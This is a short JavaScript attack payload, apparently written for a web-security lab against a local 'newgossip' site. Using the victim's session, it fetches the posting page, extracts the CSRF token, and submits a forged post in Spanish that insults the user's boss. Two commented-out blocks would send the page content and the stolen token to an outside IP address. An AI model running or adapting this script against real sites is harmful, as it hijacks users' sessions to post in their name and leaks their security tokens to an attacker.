var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true; // no change csrf token
req1.send();

/*
var response = req1.responseText;
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.1.11/?response=' + btoa(response));
req2.send();
*/

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

/*
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.1.11/?token=' + token);
req2.send();
*/

var req2 = new XMLHttpRequest();
var data = "title=Mi%20jefe%20es%20un%20cabron&subtitle=Jefe%20Cabronazo&text=Odio%20a%20mi%20equipo%20de%20trabajo%20y%20mi%20jefe%20es%20un%20cabrón,%20no%20me%20sube%20el%20sueldo&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip',false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);



